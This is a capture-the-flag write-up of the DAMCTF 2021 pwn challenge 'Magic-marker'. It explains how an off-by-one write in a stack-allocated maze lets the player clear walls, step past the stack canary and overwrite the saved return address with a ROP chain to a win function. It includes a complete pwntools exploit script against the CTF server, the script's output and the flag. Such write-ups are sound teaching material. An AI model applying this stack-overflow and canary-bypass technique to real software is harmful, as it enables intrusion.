---
layout: post
title:  "[DAMCTF] Magic-marker"
date:   "2021-11-07"
categories: Pwn
author: Eurus
---

This is the output of checksec over the ELF of this challenge.

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

First of all we can see that the program perform a string compare of the input with the string ```jump up and down``` 

```c
...
while ( 1 ){
    fgets(v5, 32, stdin);
    if ( !strcmp(v5, "jump up and down\n") )
        break;
    puts("I'm not sure I understand.");
}

puts(""Oh no! The ground.....  way out...\n")
play_maze();
```

The function ```play_maze()``` handle the 'Game', a random generated maze that has no exit.

```c
 char maze[51208]; // [rsp+10h] [rbp-C848h]
 
 ...

puts("This room has exits to the ");
maze_data = *(_DWORD *)&maze[1280 * line + 28 + 32 * column];
if ( (maze_data & 8) != 0 ){
  puts("North");
  maze_data = *(_DWORD *)&maze[1280 * line + 28 + 32 * column];
}
if ( (maze_data & 4) != 0 ){
  puts("East");
  maze_data = *(_DWORD *)&maze[1280 * line + 28 + 32 * column];
}
if ( (maze_data & 2) != 0 ){
  puts("South");
  maze_data = *(_DWORD *)&maze[1280 * line + 28 + 32 * column];
}
if ( (maze_data & 1) != 0 )
  puts("West");
if ( maze[1280 * line + 32 * column] )
  printf("On the wall is written: %s\n", &maze[1280 * line + 32 * column]);
printf("\nWhat would you like to do? (w - go north, a - go west, s - go south, d - go east, x - write something, m - show map, q - give up): ");
```

From the dump above (placed into the play_maze function) we can see that the maze is placed in the stack into an array of size 51208 byte. 
Each cell of the maze is stored into the array and the cell is of size 32 byte and the cell has a structure like this:

```text

cell:                          
                               
[-WALL-STRING----------------|FLAGS]

FLAGS: last nibble of cell and store
       where the wall are placed:
       1 = No wall
       0 = Wall

       0001 = West  free
       0010 = South free
       0100 = East  free
       1000 = North free

maze:
    [cell-1, cell-2, ... , cell-(40*40) ]

```

If we make the calculations we can see that ```40 * 40 * 32 = 51200``` and so the array is 8 bytes biggher than the maze.
When we move inside the maze basicaly we move the pointer to the array maze.

In the game we have a magic marker. We can use it with the x option. This is the code that write to the wall.

```c
puts("Your magnificently magestic magic marker magically manifests itself in your hand. What would you like to write?");
fgets(&maze[1280 * line + 32 * column], 33, stdin); // 1280 == 40*32 (cell in a row)
```
We can see that with the magic marker we can write over the last nibble of the cell that contain the wall data. 
So we can erase walls ang go where we want.

```python
pyl_clear_wall = p32(0)*7+p32(0xff)
```

by writing ```pyl_clear_wall``` we can erase all the wall from the maze and we can go also out of the maze (climbing the stack).

```
STACK OF play_maze

-000000000000C848 maze            db 51208 dup(?)
-0000000000000040 canary          dq 8 dup(?)             ; char
+0000000000000000  r

last cell of the maze]---8B---[canary]---8B---[-rbx--][-rbp--][-r12--][-r13--][-r14--][-r15--][-rip--]
                     |                               |                               |                
                     ^                               ^                               ^
                     cell[40*40+1]                   cell[40*40+2]                   cell[40*40+3]
```

we can see that if we have an rbx that permit us to go on East and West we can jump over the canary without
touch it and than continue util we can overwrite the rip saved into the stack.

Since PIE is not enabled this is easy. But where we can jump ? 
The organizers were so kind to give us a feature that prints out the flag!

```c
unsigned win(){
  ...
  puts("Congratulations! You escaped the maze and got the flag!");
  fd = fopen("flag", "r");
  fgets(str_tmp, 100, fd);
  puts(str_tmp);
  fclose(fd);
  ...
}
```
So the plan is easy! reach the bottom right of the maze find an rbx value that permit us to jump to East and West
without touching the canary, then jump again untill we reach the r15 recister saved into the stack and write with 
our magic marker a little ropchain to return into the win function.

This is the exploit.

```python
from pwn import *

context.binary = elf = ELF('./magic-marker')

p = remote('chals.damctf.xyz', 31313)
#p = elf.process()



p.sendlineafter(b'?\n',b'jump up and down')

p.sendlineafter(b'): ',b'm')

map_start = []
for i in range(0,81):
	map_start.append(str(p.recvline()[:-1])[2:-2])

line = ''
line_ind = 0
for i in range(0,81,2):
	if '*' in map_start[i+1]:
		line_ind = int(i/2)
		line = map_start[i+1]
		break 

cell = int((line.find('*')-2)/4)
print(cell)

pyl_clear_wall = p32(0)*7+p32(0xff)

for i in range(int(cell), 39):
	p.sendlineafter(b'): ',b'x')
	p.recvline()
	p.sendline(pyl_clear_wall)
	p.sendlineafter(b'): ',b'd')

for i in range(line_ind, 39):
	p.sendlineafter(b'): ',b'x')
	p.recvline()
	p.sendline(pyl_clear_wall)
	p.sendlineafter(b'): ',b's')

log.success('OOOK in 40:40 now!')

# here  corner down right
ret_g =  next(elf.search(asm('ret')))
win_payload = p64(0)+p64(ret_g)+p64(elf.sym.win)

p.sendlineafter(b'): ',b'x')
p.recvline()
p.sendline(pyl_clear_wall)
p.sendlineafter(b'): ',b'd')

log.info('Now out of the maze')
log.info('Praying!')

p.sendlineafter(b'): ',b'd')
p.sendlineafter(b'): ',b'x')
p.recvline()
p.sendline(pyl_clear_wall)
p.sendlineafter(b'): ',b'd')
p.sendlineafter(b'): ',b'x')
p.recvline()
p.sendline(win_payload)

p.sendlineafter(b'): ',b'a')
p.sendlineafter(b'): ',b'a')
p.sendlineafter(b'): ',b'a')

log.info('Back in this maze, shit! I quit!')
p.sendlineafter(b'): ',b'q')
dump = p.readall()
dump = str(dump).split('\\n')
log.success(dump[-3])

```

this is the output!
```text
(.pwn) eurus@node-03:~/Documenti/my_writeup/damctf-2021/magic_marker$ python3 expl.py 
[*] '/home/eurus/Documenti/my_writeup/damctf-2021/magic_marker/magic-marker'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chals.damctf.xyz on port 31313: Done
15
[+] OOOK in 40:40 now!
[*] Now out of the maze
[*] Praying!
[*] Back in this maze, shit! I quit!
[+] Receiving all data: Done (11.82KB)
[*] Closed connection to chals.damctf.xyz port 31313
[+] dam{m4rvellOU5lY_M49n1f1cen7_m491C_m4rker5_M4KE_M4zE_M4n1PuL471oN_M4R91N4llY_M4L1c1Ou5}
```

